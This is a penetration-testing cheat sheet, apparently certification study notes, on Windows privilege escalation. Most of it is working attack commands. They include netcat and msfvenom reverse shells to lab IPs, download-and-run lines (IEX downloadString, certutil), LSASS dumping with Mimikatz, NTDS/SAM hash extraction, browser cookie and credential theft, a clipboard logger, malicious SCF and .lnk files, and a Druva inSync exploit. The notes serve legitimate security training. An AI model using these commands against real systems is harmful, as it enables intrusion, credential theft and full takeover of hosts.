---
title: "Windows Privilege Escalation"
date: 2026-03-31 10:14:00 +0000
categories: [Certifications Technical Notes, Certified Penetration Testing Specialist (CPTS)]
tags: [offensive security, privilege escalation]
---

## Introduction

### Useful Tools

| **Tool** | **Description** |
| --- | --- |
| [Seatbelt](https://github.com/GhostPack/Seatbelt) | C# project for performing a wide variety of local privilege escalation checks |
| [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) | Script that searches for possible paths to escalate privileges on Windows hosts |
| [PowerUp](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1) | PowerShell script for finding common Windows privilege escalation vectors |
| [SharpUp](https://github.com/GhostPack/SharpUp) | C# version of PowerUp |
| [JAWS](https://github.com/411Hall/JAWS) | PowerShell 2.0 script for enumerating privilege escalation vectors |
| [SessionGopher](https://github.com/Arvanaghi/SessionGopher) | Finds and decrypts saved session information for PuTTY, WinSCP, FileZilla, and RDP |
| [Watson](https://github.com/rasta-mouse/Watson) | .NET tool to enumerate missing KBs and suggest exploits |
| [LaZagne](https://github.com/AlessandroZ/LaZagne) | Retrieve passwords stored locally (browsers, databases, Git, email, etc.) |
| [WES-NG](https://github.com/bitsadmin/wesng) | Tool based on `systeminfo` output that lists vulnerabilities and available exploits |
| [Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) | AccessChk, PipeList, PsService, and more |

---

## Situational Awareness

- Network Information
    - Routing tables: `route print`
    - ARP table/cache: `arp -a`
    - Interfaces: `ipconfig /all`

- Protection Enumeration
```powershell
    # AppLocker Policies
    Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
    # Test AppLocker policies
    Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
    # Windows Defender Status
    Get-MpComputerStatus
```

---

## Initial Enumeration

- Key data points: OS name, OS version, running services (especially those running as `NT AUTHORITY\SYSTEM`)

- Running processes
```powershell
    tasklist /svc
```

- Environment variables
```powershell
    set
```

- System info
```powershell
    systeminfo
```

- Query hotfixes if systeminfo shows none
```powershell
    Get-HotFix | ft -AutoSize
    wmic qfe
```

- Installed programs
```powershell
    Get-WmiObject -Class Win32_Product | select Name, Version
    wmic product get name
```

- Active TCP and UDP connections
```powershell
    netstat -ano
```

- User & Group Information
```powershell
    query user                      # Logged-In Users
    echo %USERNAME%                 # Current User
    whoami /all                     # Current User Privileges
    whoami /groups                  # Current User Groups
    net user                        # All Users
    net localgroup                  # All Groups
    net localgroup administrators   # Details About a Group
    net accounts                    # Password Policy
```

---

## Named Pipes Enumeration

- Common local privilege escalation: FileZilla (port 14147), Splunk Universal Forwarder, Erlang port 25672 (default secret: `rabbit`)
```powershell
    # List Named Pipes
    gci \\.\pipe\
    pipelist.exe /accepteula
    # Enumerate all named pipe permissions
    accesschk.exe /accepteula \pipe\
    # LSASS pipe
    accesschk.exe /accepteula \\.\Pipe\lsass -v
    # Enumerate all pipes with write access
    accesschk.exe -w \pipe\* -v
```

---

## Windows User Privileges Overview

### Group Rights and Privileges

| **Group** | **Description** |
| --- | --- |
| Default Administrators | Domain Admins and Enterprise Admins are "super" groups |
| Server Operators | Modify services, access SMB shares, backup files |
| Backup Operators | Log onto DCs locally, shadow copy SAM/NTDS, read registry remotely |
| Print Operators | Log on to DCs locally and load malicious drivers |
| Hyper-V Administrators | Should be considered Domain Admins if virtual DCs exist |
| Account Operators | Modify non-protected accounts and groups |
| Remote Desktop Users | Often granted `Allow Login Through Remote Desktop Services` |
| Remote Management Users | Log on to DCs with PSRemoting |
| Group Policy Creator Owners | Create new GPOs |
| Schema Admins | Modify the Active Directory schema structure |
| DNS Admins | Load a DLL on a DC; more reliable via WPAD record creation |

### Key User Rights

| **Privilege** | **Description** |
| --- | --- |
| `SeBackupPrivilege` | Bypass file/directory permissions for backup purposes |
| `SeDebugPrivilege` | Attach to or open any process (access LSASS) |
| `SeImpersonatePrivilege` | Impersonate a client after authentication |
| `SeLoadDriverPrivilege` | Dynamically load and unload device drivers |
| `SeTakeOwnershipPrivilege` | Take ownership of any securable object |
| `SeRestorePrivilege` | Bypass permissions when restoring backed-up files |
| `SeSecurityPrivilege` | Manage auditing and security log |

---

## SeImpersonate and SeAssignPrimaryToken

### JuicyPotato

- [JuicyPotato](https://github.com/ohpe/juicy-potato) exploits `SeImpersonate` or `SeAssignPrimaryToken` via DCOM/NTLM reflection abuse
```powershell
    xp_cmdshell c:\windows\temp\jp.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\windows\temp\nc.exe 10.10.14.99 9191 -e cmd.exe" -t *
```

### PrintSpoofer & RoguePotato

```bash
    xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.99 9191 -e cmd"
```

---

## SeDebugPrivilege

- [Automated PoC](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)

- Dump LSASS
```bash
    procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

- Extract hashes with Mimikatz
```bash
    mimikatz # sekurlsa::mimidump lsass.dmp
    mimikatz # sekurlsa::logonpasswords
```

- Manual privilege escalation using [psgetsys.ps1](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```powershell
    tasklist
    .\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,"c:\windows\system32\cmd.exe","")
```

---

## SeTakeOwnershipPrivilege

- Enable SeTakeOwnershipPrivilege using [EnableAllTokenPrivs.ps1](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1)
```powershell
    Import-Module .\Enable-Privilege.ps1
    .\EnableAllTokenPrivs.ps1
```

- Taking Ownership
```powershell
    # Check ownership
    cmd /c dir /q 'C:\Department Shares\Private\IT'
    # Change ownership
    takeown /f 'C:\Department Shares\Private\IT\cred.txt'
    # Modify the file ACL
    icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```

---

## Windows Group Privileges

### Backup Operators

- Grants `SeBackupPrivilege` and `SeRestore` - can traverse any folder and list contents
- PoC: [SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege)

1. Import Libraries
```powershell
    Import-Module .\SeBackupPrivilegeUtils.dll
    Import-Module .\SeBackupPrivilegeCmdLets.dll
```

2. Enable and verify
```powershell
    Set-SeBackupPrivilege
    Get-SeBackupPrivilege
```

3. Access a restricted file
```powershell
    Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
```

4. Attacking NTDS.dit
```powershell
    # Create shadow copy of C drive
    diskshadow.exe
    # Copy NTDS.dit locally
    Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
    # Or using robocopy
    robocopy /B E:\Windows\NTDS .\ntds ntds.dit
    # Back up SAM and SYSTEM hives
    reg save HKLM\SYSTEM SYSTEM.SAV
    reg save HKLM\SAM SAM.SAV
```

5. Obtain hashes using DSInternals
```powershell
    Import-Module .\DSInternals.psd1
    $key = Get-BootKey -SystemHivePath .\SYSTEM
    Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=mgmt,DC=local' -DBPath .\ntds.dit -BootKey $key
    # or using secretsdump
    secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

---

### Event Log Readers
1. Confirm group membership
```powershell
    net localgroup "Event Log Readers"
```
2. Search security log with wevtutil
```powershell
    wevtutil qe Security /rd:true /f:text | Select-String "/user"
```
3. Passing credentials
```powershell
    wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```
4. Using Get-WinEvent
```powershell
    Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```
> The [PowerShell Operational](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows) log may contain sensitive info accessible to unprivileged users.

---

### DnsAdmins

- DNS management is performed over RPC; members can load a custom DLL via `dnscmd` with zero verification

1. Generate a malicious DLL
```powershell
    msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

2. Host and download to target
```powershell
    python3 -m http.server 7777
    wget "http://10.10.15.45:7777/adduser.dll" -outfile "adduser.dll"
```

3. Load DLL via dnscmd (full path required)
```powershell
    dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

4. Restart the DNS service
```powershell
    wmic useraccount where name="netadm" get sid
    sc.exe sdshow DNS
    sc stop dns
    sc start dns
    net group "Domain Admins" /dom
```

5. Cleanup
```powershell
    reg query \\10.129.43.42\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
    reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
    sc.exe start dns
    sc query dns
```

- Create a WPAD record (MiTM attack)
```powershell
    Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
    Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```

---

### Hyper-V Administrators

- Upon deleting a VM, `vmms.exe` attempts to restore file permissions as `NT AUTHORITY\SYSTEM`; we can exploit this with hardlinks

1. Target and take ownership of a file
```powershell
    takeown /F "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
    sc.exe start MozillaMaintenance
```
> Also check for [CVE-2018-0952](https://www.tenable.com/cve/CVE-2018-0952) or [CVE-2019-0841](https://www.tenable.com/cve/CVE-2019-0841)

---

### Print Operators

> Vulnerable OS: ≥ Windows 10 Version 1803; abuses `SeLoadDriverPrivilege`.

1. Compile the exploit ([EnableSeLoadDriverPrivilege.cpp](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp))
```powershell
    cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```

2. Add the Capcom.sys driver to registry
```powershell
    reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
    reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```

3. Enable the privilege and load the driver
```powershell
    EnableSeLoadDriverPrivilege.exe
    .\DriverView.exe /stext drivers.txt
    cat drivers.txt | Select-String -pattern Capcom
```

4. Exploit with [ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
```powershell
    .\ExploitCapcom.exe
```

5. Automated approach using [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/)
```powershell
    EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```

6. Cleanup
```powershell
    reg delete HKCU\System\CurrentControlSet\Capcom
```

---

### Server Operators

- Abusing `AppReadiness` service (starts as SYSTEM)
```powershell
    # Confirm service runs as SYSTEM
    sc qc AppReadiness
    # Check service permissions with PsService
    c:\Tools\PsService.exe security AppReadiness
    # Modify the service binary path
    sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
    sc start AppReadiness
```

---

## User Account Control (UAC)

- Confirm UAC is enabled
```powershell
    REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```

- Check UAC level
```powershell
    REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```
> Value `0x5` = highest UAC level (`Always notify`). Fewer bypasses exist at this level.

- Check Windows version
```powershell
    [environment]::OSVersion.Version
```

### UAC Bypass - Windows 10 Build 14393

- Targets the 32-bit auto-elevating binary `SystemPropertiesAdvanced.exe`

1. Review PATH variable
```powershell
    cmd /c echo %PATH%
```

2. Generate malicious DLL
```bash
    msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
```

3. Download DLL to target
```bash
    curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```

4. Test connection
```bash
    rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

5. Kill existing rundll32 processes and trigger the bypass
```bash
    tasklist /svc | findstr "rundll32"
    taskkill /PID xxx /F
    C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

---

## Weak Permissions

### Permissive File System ACLs (modifiable service binaries)

```powershell
    .\SharpUp.exe audit
    icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
    # Replace with malicious binary
    cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
    sc start SecurityService
```

### Weak Service Permissions

```powershell
    accesschk.exe /accepteula -quvcw WindscribeService
    sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
    sc stop WindscribeService
    sc start WindscribeService
    # Cleanup
    sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"
    sc start WindScribeService
    sc query WindScribeService
```

### Unquoted Service Path

```powershell
    sc qc SystemExplorerHelpService
    wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """"
```

### Permissive Registry ACLs

```powershell
    accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
    Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```

### Modifiable Registry Autorun Binary

```powershell
    Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```

---

## Kernel Exploits

### CVE-2021-36934 (HiveNightmare / SeriousSam)

1. Check permissions on the SAM file (requires one or more shadow copies)
```powershell
    icacls c:\Windows\System32\config\SAM
```

2. Perform attack
```powershell
    .\HiveNightmare.exe
```

3. Extract hashes
```powershell
    impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local
```

### CVE-2021-1675/CVE-2021-34527 (PrintNightmare)

```powershell
    ls \\localhost\pipe\spoolss
    Set-ExecutionPolicy Bypass -Scope Process
    Import-Module .\CVE-2021-1675.ps1
    Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
```

### Enumerating Missing Patches

```powershell
    systeminfo
    wmic qfe list brief
    Get-Hotfix
```
> Search each KB ID in the [Microsoft Update Catalog](https://www.catalog.update.microsoft.com/Search.aspx?q=KB5000808)

### CVE-2020-0668

1. Check privileges
```powershell
    whoami /priv
```

2. Generate malicious binary
```bash
    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe
```

3. Run the exploit and replace the service binary
```bash
    C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
    copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
    net start MozillaMaintenance
```

---

## Vulnerable Services

```bash
    wmic product get name
    netstat -ano | findstr 6064
    Get-Process -Id 3324
    Get-Service | ? {$_.DisplayName -like 'sonarqube*'}
```

- Druva inSync Local Privilege Escalation PoC
```powershell
    $cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.15.45:8080/shell.ps1')"
    $s = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Stream,[System.Net.Sockets.ProtocolType]::Tcp)
    $s.Connect("127.0.0.1", 6064)
    $header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
    $rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
    $command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
    $length = [System.BitConverter]::GetBytes($command.Length);
    $s.Send($header); $s.Send($rpcType); $s.Send($length); $s.Send($command)
```

---

## DLL Injection Methods

### 1. LoadLibrary

- Uses Windows API to load DLL into target process's address space

Steps:
1. Open target process handle
2. Allocate memory in target for DLL path
3. Write DLL path to that memory
4. Get `LoadLibraryA` address from `kernel32.dll`
5. Create remote thread in target starting at `LoadLibraryA`

### 2. Manual Mapping

- Advanced method that avoids `LoadLibrary` to evade detection

Steps:
1. Load DLL as raw data into injector process
2. Map DLL sections into target process
3. Inject shellcode to target: relocate DLL, fix imports, run TLS callbacks, call DllMain

### 3. Reflective DLL Injection

- Loads DLL from memory using reflective programming; DLL handles its own loading via minimal PE loader

Steps (Stephen Fewer method):
1. Transfer execution to DLL's `ReflectiveLoader`
2. Calculate current image location
3. Parse `kernel32.dll` for `LoadLibraryA`, `GetProcAddress`, `VirtualAlloc`
4. Allocate memory for image copy
5. Load headers/sections into new memory
6. Resolve imports, process relocations, call `DllMain`

### 4. DLL Hijacking

- Exploits Windows DLL loading when app doesn't specify full path; attacker places malicious DLL in search path
- **Safe DLL Search Mode** (default enabled): Prioritizes safer directories

Search order (enabled):
1. App directory → System dir → 16-bit system dir → Windows dir → Current dir → PATH dirs

Tools to identify DLLs: **Process Explorer**, **PE Explorer**, **Process Monitor** (filter for `NAME NOT FOUND`)

---

## Credential Hunting

```powershell
    # Search for file by name
    Get-ChildItem -Path C:\ -Recurse -Filter pass.xml -ErrorAction SilentlyContinue
    # Application config files
    findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
    # Chrome dictionary files
    gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
    # PowerShell history
    (Get-PSReadLineOption).HistorySavePath
    gc (Get-PSReadLineOption).HistorySavePath
    foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
    # PowerShell credentials (DPAPI)
    $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
    $credential.GetNetworkCredential().username
    $credential.GetNetworkCredential().password
```

---

## Other Files & Credential Sources

```bash
    # Search file content - CMD
    findstr /SI /M "password" *.xml *.ini *.txt
    findstr /spin "password" *.*
    # Search file content - PowerShell
    select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password
    # Search file extension - CMD
    dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
    where /R C:\ *.config
    # Search file extension - PowerShell
    Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```

- Sticky Notes (SQLite database)
```powershell
    Set-ExecutionPolicy Bypass -Scope Process
    cd .\PSSQLite\
    Import-Module .\PSSQLite.psd1
    $db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
    Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
```

- Files and folders that may contain credentials

```
    %SYSTEMDRIVE%\pagefile.sys
    %WINDIR%\repair\sam, %WINDIR%\repair\system, %WINDIR%\repair\software
    %WINDIR%\system32\config\default.sav, security.sav, software.sav, system.sav
    %USERPROFILE%\ntuser.dat
    C:\ProgramData\Configs\*
    C:\Program Files\Windows PowerShell\*
```

---

## Further Credential Theft

```powershell
    # Cmdkey saved credentials
    cmdkey /list
    runas /savecred /user:inlanefreight\bob "COMMAND HERE"
    # Browser credentials (Chrome)
    .\SharpChrome.exe logins /unprotect
    # KeePass hash extraction and cracking
    python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx
    hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
    # LaZagne - run all modules
    .\lazagne.exe all
    # SessionGopher (PuTTY, WinSCP, FileZilla, RDP)
    Import-Module .\SessionGopher.ps1
    Invoke-SessionGopher -Target WINLPE-SRV01
```

- Cleartext password storage in the registry
```powershell
    # Autologon credentials
    reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    # PuTTY saved sessions
    reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

- WiFi passwords
```powershell
    netsh wlan show profile
    netsh wlan show profile ilfreight_corp key=clear
```

---

## Restricted Environments (Citrix Breakout)

### Basic Methodology
1. Gain access to a Dialog Box
2. Exploit the Dialog Box for command execution
3. Escalate privileges

### Techniques

- **Bypass path restriction**: Open MS Paint → File → Open → enter UNC path `\\127.0.0.1\c$\users\pmorgan`
- **Access SMB share**:
```bash
    smbserver.py -smb2support share $(pwd)
```
  Then navigate to `\\10.13.38.95\share` via the Paint dialog and execute a CMD-launching binary

- **Alternate Explorer**: [Explorer++](https://explorerplusplus.com/) — bypasses folder restrictions from Group Policy
- **Script execution**: Create `evil.bat` with `cmd` as content and execute it
- **Modify shortcut**: Set Target field in Properties to `C:\Windows\System32\cmd.exe`

### Escalate Privileges

```powershell
    Import-Module .\PowerUp.ps1
    Write-UserAddMSI
    Invoke-AllChecks
    runas /user:backdoor cmd
```

### Bypass UAC

```powershell
    Import-Module .\Bypass-UAC.ps1
    Bypass-UAC -Method UacMethodSysprep
```

---

## Interacting with Users

### Process Command Lines Monitoring

```powershell
    while($true) {
      $process = Get-WmiObject Win32_Process | Select-Object CommandLine
      Start-Sleep 1
      $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
      Compare-Object -ReferenceObject $process -DifferenceObject $process2
    }
    # Run monitor on target host
    IEX (iwr 'http://10.10.10.205/procmon.ps1')
```

### SCF File on a Share (LLMNR Capture)

1. Create malicious SCF file (e.g., `@Inventory.scf`)
```
    [Shell]
    Command=2
    IconFile=\\172.16.139.35\share\legit.ico
    [Taskbar]
    Command=ToggleDesktop
```

2. Start Responder and crack the captured NTLMv2 hash
```bash
    sudo responder -wrf -v -I tun0
    hashcat -m 5600 hash /usr/share/wordlist/rockyou.txt
```

### Malicious .lnk File (Server 2019+)

```powershell
    $objShell = New-Object -ComObject WScript.Shell
    $lnk = $objShell.CreateShortcut("C:\legit.lnk")
    $lnk.TargetPath = "\\<attackerIP>\@pwn.png"
    $lnk.WindowStyle = 1
    $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
    $lnk.Save()
```

---

## Pillaging

```powershell
    # Installed applications via registry
    $INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
    $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
    $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
```

- Crack `mRemoteNG` password
```bash
    python3 mremoteng_decrypt.py -s "<encrypted_string>"
    python3 mremoteng_decrypt.py -s "<encrypted_string>" -p admin
    for password in $(cat /usr/share/wordlists/fasttrack.txt); do python3 mremoteng_decrypt.py -s "<hash>" -p $password 2>/dev/null; done
```

- Abusing cookies for IM access (Slack, Teams)
```bash
    # Firefox
    copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
    python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
    # Chrome
    copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
    Invoke-SharpChromium -Command "cookies slack.com"
```

- Monitor clipboard
```powershell
    IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
    Invoke-ClipboardLogger
```

- Abuse `restic` to backup sensitive files
```powershell
    mkdir E:\restic2; restic.exe -r E:\restic2 init
    $env:RESTIC_PASSWORD = 'Password'
    restic.exe -r E:\restic2\ backup C:\SampleFolder
    # Using VSS (shadow copy)
    restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot
    restic.exe -r E:\restic2\ snapshots
    restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore
```

---

## Miscellaneous Techniques

- File transfer with `certutil`
```powershell
    certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
    certutil -encode file1 encodedfile
    certutil -decode encodedfile file2
```

- Abuse `AlwaysInstallElevated`
```powershell
    reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
```bash
    msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
    msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
```

- Scheduled Tasks
```powershell
    schtasks /query /fo LIST /v
    Get-ScheduledTask | select TaskName,State
```

- User/Computer Description Fields
```powershell
    Get-LocalUser
    Get-WmiObject -Class Win32_OperatingSystem | select Description
```

- Mount VHDX/VMDK
```bash
    guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
    guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1
```

---

## Windows Server Legacy Exploitation
1. Query current patch level
```powershell
    wmic qfe 
```
2. Run Sherlock vulnerability scanner
```powershell
    Set-ExecutionPolicy bypass -Scope process
    Import-Module .\Sherlock.ps1
    Find-AllVulns
```
3. After getting prompted that the system is vulnerable to `MS10_092`, we can exploit it
```powershell
    exploit(windows/smb/smb_delivery) # msfconsole
    rundll32.exe \\10.10.14.3\lEUZam\test.dll,0
    exploit(windows/local/ms10_092_schelevator) # msfconsole
```

## Windows 7 Legacy Exploitation
- Use [windows-exploit-suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) to find vulnerabilities
```bash
    python2.7 windows-exploit-suggester.py --update
    python2.7 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt
```

- Exploit [MS16-032](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1)
```powershell
    Set-ExecutionPolicy bypass -scope process
    Import-Module .\Invoke-MS16-032.ps1
    Invoke-MS16-032
```
